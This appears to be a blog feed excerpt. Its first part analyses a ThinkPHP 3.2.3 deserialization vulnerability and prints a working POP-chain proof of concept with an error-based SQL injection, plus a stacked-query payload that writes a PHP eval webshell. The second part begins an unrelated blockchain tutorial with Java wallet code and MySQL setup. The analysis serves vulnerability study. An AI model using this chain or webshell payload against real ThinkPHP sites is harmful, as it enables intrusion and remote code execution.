<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722123631954.png"></p>
<p>以上就是整个bind注入的代码逻辑</p>
<hr>
<h2 id="ThinkPHP3-2-3-反序列化漏洞"><a href="#ThinkPHP3-2-3-反序列化漏洞" class="headerlink" title="ThinkPHP3.2.3 反序列化漏洞"></a>ThinkPHP3.2.3 反序列化漏洞</h2><p>入口文件：<code>Application/Home/Controller/IndexController.class.php</code></p>
<p>修改一下<code>index()</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function index()&#123;</span><br><span class="line">    echo base64_decode($_GET[&#x27;payload&#x27;]);</span><br><span class="line">    $output=unserialize(base64_decode($_GET[&#x27;payload&#x27;]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Image</span>\<span class="title class_">Driver</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Think</span>\<span class="title class_">Session</span>\<span class="title class_">Driver</span>\<span class="title class_">Memcache</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Imagick</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$img</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;img = <span class="keyword">new</span> <span class="title class_">Memcache</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Session</span>\<span class="title class_">Driver</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Think</span>\<span class="title class_">Model</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handle</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handle = <span class="keyword">new</span> <span class="title class_">Model</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Think</span>\<span class="title class_">Db</span>\<span class="title class_">Driver</span>\<span class="title class_">Mysql</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$pk</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;db = <span class="keyword">new</span> <span class="title class_">Mysql</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;pk = <span class="string">&quot;id&quot;</span>;  <span class="comment">//表的字段名</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data[<span class="variable language_">$this</span>-&gt;pk] = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;table&quot;</span> =&gt; <span class="string">&quot;think_user where 0 or updatexml(1,concat(0x7e,user(),0x7e),1)#&quot;</span>,</span><br><span class="line">                <span class="string">&quot;where&quot;</span> =&gt; <span class="string">&quot;1=1&quot;</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Db</span>\<span class="title class_">Driver</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Mysql</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">config</span> = <span class="title class_">array</span>(</span><br><span class="line">            &quot;<span class="title class_">debug</span>&quot;    =&gt; 1,</span><br><span class="line">            &quot;<span class="title class_">database</span>&quot; =&gt; &quot;<span class="title class_">thinkphp3</span>&quot;,</span><br><span class="line">            &quot;<span class="title class_">hostname</span>&quot; =&gt; &quot;127.0.0.1&quot;,</span><br><span class="line">            &quot;<span class="title class_">hostport</span>&quot; =&gt; &quot;3306&quot;,</span><br><span class="line">            &quot;<span class="title class_">charset</span>&quot;  =&gt; &quot;<span class="title class_">utf8</span>&quot;,</span><br><span class="line">            &quot;<span class="title class_">username</span>&quot; =&gt; &quot;<span class="title class_">rev1ve</span>&quot;,</span><br><span class="line">            &quot;<span class="title class_">password</span>&quot; =&gt; &quot;<span class="title class_">rev1ve</span>&quot;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">a</span> = <span class="title class_">new</span> <span class="title class_">Think</span>\<span class="title class_">Image</span>\<span class="title class_">Driver</span>\<span class="title class_">Imagick</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行结果如下</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240723180359882.png"></p>
<p>不过由于报错注入权限比较低，我们要想拿shell的话需要写入木马，所以可以<strong>开启堆叠</strong>后写入一句话木马</p>
<p>修改下table键就行</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">think_user;<span class="keyword">select</span> &quot;&lt;?php eval($_POST[1]);?&gt;&quot; <span class="keyword">into</span> outfile &quot;/var/www/html/a.php&quot;# </span><br></pre></td></tr></table></figure>

<h3 id="POP链分析"><a href="#POP链分析" class="headerlink" title="POP链分析"></a>POP链分析</h3><p>因为大多数反序列化漏洞，都是由<code>__destruct()</code>魔术方法引起的，因此全局搜索<code>public function __destruct()</code></p>
<p>注：在寻找<code>__destruct()</code>可用的魔术方法需遵循“<strong>可控变量尽可能多</strong>”的原则</p>
<p>比如下图这个，没啥可控参数就不好利用</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722185426755.png"></p>
<p>这里我们选择<code>ThinkPHP\Library\Think\Image\Driver\Imagick.class.php</code>的<code>__dustruct()</code>方法</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240723121155030.png"></p>
<p>如果<code>$this-img</code>不为空，那么调用<code>destroy()</code></p>
<blockquote>
<p>注：这里有一个坑点，就是在PHP7版本中，如果调用一个含参数的方法，却不传入参数时ThinkPHP会报错，而在PHP5版本中不会报错，这也是为什么我们选择PHP5版本搭建</p>
</blockquote>
<p>继续全局搜索<code>destroy()</code>方法，跟进<code>ThinkPHP\Library\Think\Session\Driver\Memcache.class.php</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function destroy($sessID)</span><br><span class="line">&#123;</span><br><span class="line">	return $this-&gt;handle-&gt;delete($this-&gt;sessionName . $sessID);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的<code>delete()</code>方法的参数看似可控，其实不可控，因为下方全局搜索后，<code>delete()</code>方法需要的参数大多数都为<code>array</code>形式，而上方传入的是<code>$this-&gt;sessionName.$sessID</code>，即使<code>$this-&gt;sesionName</code>设置为数组<code>array</code>，但是<code>$sessID</code>如果为空值，在PHP中，用<code>.</code>连接符连接，得到的结果为字符串<code>array</code></p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240723122038853.png"></p>
<p>虽然不可控，但我们还是全局搜索一下</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240723172640856.png"></p>
<p>注意到<code>ThinkPHP\Mode\Lite\Model.class.php</code>这里的<code>delete()</code>方法又调用了一次<code>delete()</code>方法，而这里传入的参数是<code>data[pk]</code>，我们跟进一下<code>getPk()</code>，发现完全可控</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function getPk()</span><br><span class="line">&#123;</span><br><span class="line">	return $this-&gt;pk;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们在这个方法先添加一行代码<code>echo &quot;&lt;br&gt;&quot;.&quot;success&quot;;</code>，验证一下思路是否正确</p>
<p>前面一共涉及到三个类，链子为<code>Imagick -&gt; Memcache -&gt; Model</code>，然后构造demo如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Think\Image\Driver &#123;</span><br><span class="line"></span><br><span class="line">    use Think\Session\Driver\Memcache;</span><br><span class="line"></span><br><span class="line">    class Imagick</span><br><span class="line">    &#123;</span><br><span class="line">        private $img;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;img = new Memcache();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Think\Session\Driver &#123;</span><br><span class="line"></span><br><span class="line">    use Think\Model;</span><br><span class="line"></span><br><span class="line">    class Memcache</span><br><span class="line">    &#123;</span><br><span class="line">        protected $handle = null;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;handle = new Model();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Think &#123;</span><br><span class="line">    class Model</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace &#123;</span><br><span class="line">    $a = new Think\Image\Driver\Imagick();</span><br><span class="line">    echo base64_encode(serialize($a));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行结果如下</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240723173023706.png"></p>
<p>接下来继续分析，这里<code>$data</code>可控，然后再次调用<code>delete()</code>方法说明<code>$options</code>可控</p>
<p>我们往下翻注意到第528行有调用<code>delete()</code>方法，那么我们就可以调用自带的数据库类 Mysql.class.php 中的 delete() 方法。不过这里前提是绕过第517行的if语句，所以按照注释我们设 where 键为<code>1=1</code>即可</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240723173314682.png"></p>
<p>结合全局搜索的结果我们跟进到<code>ThinkPHP\Library\Think\Db\Driver.class.php</code>看看</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240723174306991.png"></p>
<p>跟进<code>parseTable()</code>方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    protected function parseTable($tables)</span><br><span class="line">    &#123;</span><br><span class="line">        if (is_array($tables)) &#123;</span><br><span class="line">// 支持别名定义</span><br><span class="line">            $array = array();</span><br><span class="line">            foreach ($tables as $table =&gt; $alias) &#123;</span><br><span class="line">                if (!is_numeric($table)) &#123;</span><br><span class="line">                    $array[] = $this-&gt;parseKey($table) . &#x27; &#x27; . $this-&gt;parseKey($alias);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    $array[] = $this-&gt;parseKey($alias);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            $tables = $array;</span><br><span class="line">        &#125; elseif (is_string($tables)) &#123;</span><br><span class="line">            $tables = explode(&#x27;,&#x27;, $tables);</span><br><span class="line">            array_walk($tables, array(&amp;$this, &#x27;parseKey&#x27;));</span><br><span class="line">        &#125;</span><br><span class="line">        return implode(&#x27;,&#x27;, $tables);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里只调用了<code>parseKey()</code>方法，继续跟进</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">protected function parseKey(&amp;$key)</span><br><span class="line">&#123;</span><br><span class="line">    return $key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没有过滤，直接将传入的参数返回</p>
<p>回到<code>Driver.class.php</code>，我们注意<code>$sql</code>是将<code>$table</code>和<code>DELETE FROM</code>字符串进行拼接，所以这里我们可以通过<code>options[table]</code>去进行报错注入。整理一下POP链为：<code>Imagick -&gt; Memcache -&gt; Model -&gt; Mysql</code>，我们最后只需在Mysql类配置数据库连接信息即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Db</span>\<span class="title class_">Driver</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Mysql</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">config</span> = <span class="title class_">array</span>(</span><br><span class="line">            &quot;<span class="title class_">debug</span>&quot;    =&gt; 1,</span><br><span class="line">            &quot;<span class="title class_">database</span>&quot; =&gt; &quot;<span class="title class_">thinkphp3</span>&quot;,</span><br><span class="line">            &quot;<span class="title class_">hostname</span>&quot; =&gt; &quot;127.0.0.1&quot;,</span><br><span class="line">            &quot;<span class="title class_">hostport</span>&quot; =&gt; &quot;3306&quot;,</span><br><span class="line">            &quot;<span class="title class_">charset</span>&quot;  =&gt; &quot;<span class="title class_">utf8</span>&quot;,</span><br><span class="line">            &quot;<span class="title class_">username</span>&quot; =&gt; &quot;<span class="title class_">rev1ve</span>&quot;,</span><br><span class="line">            &quot;<span class="title class_">password</span>&quot; =&gt; &quot;<span class="title class_">rev1ve</span>&quot;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上就是反序列化漏洞的完整分析</p>
<hr>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><a href="https://c1oudfl0w0.github.io/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://c1oudfl0w0.github.io/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></li>
<li><a href="https://www.freebuf.com/articles/web/329045.html">https://www.freebuf.com/articles/web/329045.html</a></li>
</ul>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>ThinkPHP</tag>
      </tags>
  </entry>
  <entry>
    <title>区块链实训4</title>
    <url>/article/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E8%AE%AD4.html</url>
    <content><![CDATA[<p>学习任务包括区块链中的公钥私钥以及钱包相关知识，以及java中ORM框架mybatis</p>
<span id="more"></span>

<h1 id="第⼀部分：区块链中的公钥私钥以及钱包"><a href="#第⼀部分：区块链中的公钥私钥以及钱包" class="headerlink" title="第⼀部分：区块链中的公钥私钥以及钱包"></a>第⼀部分：区块链中的公钥私钥以及钱包</h1><h2 id="使用java生成钱包地址公钥以及私钥"><a href="#使用java生成钱包地址公钥以及私钥" class="headerlink" title="使用java生成钱包地址公钥以及私钥"></a>使用java生成钱包地址公钥以及私钥</h2><p>在gitee上拉取项目代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://gitee.com/daitoulin/testmysql.git</span><br></pre></td></tr></table></figure>

<p> 首先需要在pom文件中引入开源包web3j（当然项目里已经引入了）</p>
<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E8%AE%AD4/image-20241019162638638.png"></p>
<p>web3j包当中内置了生成钱包地址公钥私钥的算法，我们只需调用就可以很便捷的生成。</p>
<p>文件路径：<code>testmysql\src\main\java\com\example\testmysql\utils\EthUtils.java</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.testmysql.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.testmysql.entity.EthWallet;</span><br><span class="line"><span class="keyword">import</span> org.web3j.crypto.ECKeyPair;</span><br><span class="line"><span class="keyword">import</span> org.web3j.crypto.Hash;</span><br><span class="line"><span class="keyword">import</span> org.web3j.crypto.Keys;</span><br><span class="line"><span class="keyword">import</span> org.web3j.crypto.Sign;</span><br><span class="line"><span class="keyword">import</span> org.web3j.crypto.Sign.SignatureData;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"><span class="keyword">import</span> java.security.InvalidAlgorithmParameterException;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchProviderException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EthUtils</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 1. 生成公钥和私钥对</span></span><br><span class="line">            <span class="type">ECKeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> Keys.createEcKeyPair();</span><br><span class="line">            <span class="type">BigInteger</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivateKey();</span><br><span class="line">            <span class="type">BigInteger</span> <span class="variable">publicKey</span> <span class="operator">=</span> keyPair.getPublicKey();</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;Private Key: &quot;</span> + privateKey.toString(<span class="number">16</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Public Key: &quot;</span> + publicKey.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 2. 计算以太坊地址</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">address</span> <span class="operator">=</span> publicKeyToAddress(publicKey);</span><br><span class="line">            System.out.println(<span class="string">&quot;Address: &quot;</span> + address);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 3. 签名和验证</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;Hello blockchain&quot;</span>;</span><br><span class="line">            <span class="type">SignatureData</span> <span class="variable">signature</span> <span class="operator">=</span> signMessage(message, privateKey);</span><br><span class="line">            System.out.println(<span class="string">&quot;Signature: &quot;</span> +</span><br><span class="line">                    bytesToHex(signature.getR()) +</span><br><span class="line">                    bytesToHex(signature.getS()) +</span><br><span class="line">                    String.format(<span class="string">&quot;%02x&quot;</span>, signature.getV()[<span class="number">0</span>])  <span class="comment">// 处理 byte 数组的第一个字节</span></span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">signatureStr</span> <span class="operator">=</span> bytesToHex(signature.getR()) + bytesToHex(signature.getS()) + String.format(<span class="string">&quot;%02x&quot;</span>, signature.getV()[<span class="number">0</span>]);</span><br><span class="line">            System.out.println(signatureStr);</span><br><span class="line"></span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isValid</span> <span class="operator">=</span> verifySignature(message, signature, address);</span><br><span class="line">            System.out.println(<span class="string">&quot;Is signature valid: &quot;</span> + isValid);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getSignStr</span><span class="params">(SignatureData signature)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span>  bytesToHex(signature.getR()) + bytesToHex(signature.getS()) + String.format(<span class="string">&quot;%02x&quot;</span>, signature.getV()[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> EthWallet <span class="title function_">getWallet</span><span class="params">()</span> <span class="keyword">throws</span> InvalidAlgorithmParameterException, NoSuchAlgorithmException, NoSuchProviderException &#123;</span><br><span class="line">        <span class="type">EthWallet</span> <span class="variable">wallet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EthWallet</span>();</span><br><span class="line">        <span class="type">ECKeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> Keys.createEcKeyPair();</span><br><span class="line">        <span class="type">BigInteger</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivateKey();</span><br><span class="line">        <span class="type">BigInteger</span> <span class="variable">publicKey</span> <span class="operator">=</span> keyPair.getPublicKey();</span><br><span class="line">        <span class="type">String</span> <span class="variable">address</span> <span class="operator">=</span> publicKeyToAddress(publicKey);</span><br><span class="line">        wallet.setPrivateKey(privateKey.toString(<span class="number">16</span>));</span><br><span class="line">        wallet.setPublicKey(publicKey.toString(<span class="number">16</span>));</span><br><span class="line">        wallet.setAddress(address);</span><br><span class="line">        <span class="keyword">return</span> wallet;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">publicKeyToAddress</span><span class="params">(BigInteger publicKey)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + Keys.getAddress(publicKey);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> SignatureData <span class="title function_">signMessage</span><span class="params">(String message, BigInteger privateKey)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] messageHash = Hash.sha3(message.getBytes());</span><br><span class="line">        <span class="type">ECKeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> ECKeyPair.create(privateKey);</span><br><span class="line">        <span class="keyword">return</span> Sign.signMessage(messageHash, keyPair, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">verifySignature</span><span class="params">(String message, SignatureData signature, String address)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] messageHash = Hash.sha3(message.getBytes());</span><br><span class="line">            <span class="type">BigInteger</span> <span class="variable">recoveredPublicKey</span> <span class="operator">=</span> Sign.signedMessageHashToKey(messageHash, signature);</span><br><span class="line">            <span class="type">String</span> <span class="variable">keysAddress</span> <span class="operator">=</span> publicKeyToAddress(recoveredPublicKey);</span><br><span class="line">            System.out.println(<span class="string">&quot;keysAddress: &quot;</span> + keysAddress);</span><br><span class="line">            <span class="keyword">return</span> keysAddress.equals(address);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">bytesToHex</span><span class="params">(<span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">byte</span> b : bytes) &#123;</span><br><span class="line">            sb.append(String.format(<span class="string">&quot;%02x&quot;</span>, b));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> SignatureData <span class="title function_">stringToSignatureData</span><span class="params">(String signatureStr)</span> &#123;</span><br><span class="line">        <span class="comment">// Ensure the string length is valid (r + s + v should be hex)</span></span><br><span class="line">        <span class="keyword">if</span> (signatureStr.length() &lt; <span class="number">130</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Invalid signature string length.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Extract r, s, and v components</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">rHex</span> <span class="operator">=</span> signatureStr.substring(<span class="number">0</span>, <span class="number">64</span>); <span class="comment">// First 64 characters for r</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">sHex</span> <span class="operator">=</span> signatureStr.substring(<span class="number">64</span>, <span class="number">128</span>); <span class="comment">// Next 64 characters for s</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">vHex</span> <span class="operator">=</span> signatureStr.substring(<span class="number">128</span>, <span class="number">130</span>); <span class="comment">// Last 2 characters for v</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Convert hex to byte arrays</span></span><br><span class="line">        <span class="type">byte</span>[] r = hexToBytes(rHex);</span><br><span class="line">        <span class="type">byte</span>[] s = hexToBytes(sHex);</span><br><span class="line">        <span class="type">byte</span>[] v = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;(<span class="type">byte</span>) Integer.parseInt(vHex, <span class="number">16</span>)&#125;; <span class="comment">// Convert to byte</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">SignatureData</span>(v, r, s);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Helper method to convert hex string to byte array</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] hexToBytes(String hex) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> hex.length();</span><br><span class="line">        <span class="type">byte</span>[] data = <span class="keyword">new</span> <span class="title class_">byte</span>[length / <span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; length; i += <span class="number">2</span>) &#123;</span><br><span class="line">            data[i / <span class="number">2</span>] = (<span class="type">byte</span>) ((Character.digit(hex.charAt(i), <span class="number">16</span>) &lt;&lt; <span class="number">4</span>)</span><br><span class="line">                    + Character.digit(hex.charAt(i + <span class="number">1</span>), <span class="number">16</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="第二部分：数据库配置"><a href="#第二部分：数据库配置" class="headerlink" title="第二部分：数据库配置"></a>第二部分：数据库配置</h2><h3 id="MySQL安装"><a href="#MySQL安装" class="headerlink" title="MySQL安装"></a>MySQL安装</h3><p>首先将压缩包解压到文件夹下（注意路径需要为全英文）</p>
<p>创建配置文件<code>my.ini</code>，写入以下内容</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[mysqld]</span></span><br><span class="line"><span class="comment"># 设置3306端⼝</span></span><br><span class="line"><span class="attr">port</span>=<span class="number">3306</span></span><br><span class="line"><span class="comment"># 自定义设置mysql的安装目录，即解压mysql压缩包的目录</span></span><br><span class="line"><span class="attr">basedir</span>=D:\mysql-<span class="number">8.0</span>.<span class="number">20</span>-winx64</span><br><span class="line"><span class="comment"># 自定义设置mysql数据库的数据存放目录</span></span><br><span class="line"><span class="attr">datadir</span>=D:\mysql-<span class="number">8.0</span>.<span class="number">20</span>-winx64\data</span><br><span class="line"><span class="comment"># 允许最大连接数</span></span><br><span class="line"><span class="attr">max_connections</span>=<span class="number">1000</span></span><br><span class="line"><span class="comment"># 允许连接失败的次数，这是为了防止有人从该主机试图攻击数据库系统</span></span><br><span class="line"><span class="attr">max_connect_errors</span>=<span class="number">10</span></span><br><span class="line"><span class="comment"># 服务端使用的字符集默认为UTF8</span></span><br><span class="line"><span class="attr">character-set-server</span>=utf8mb4</span><br><span class="line"><span class="comment"># 创建新表时将使用的默认存储引擎</span></span><br><span class="line"><span class="attr">default-storage-engine</span>=INNODB</span><br><span class="line"><span class="comment"># 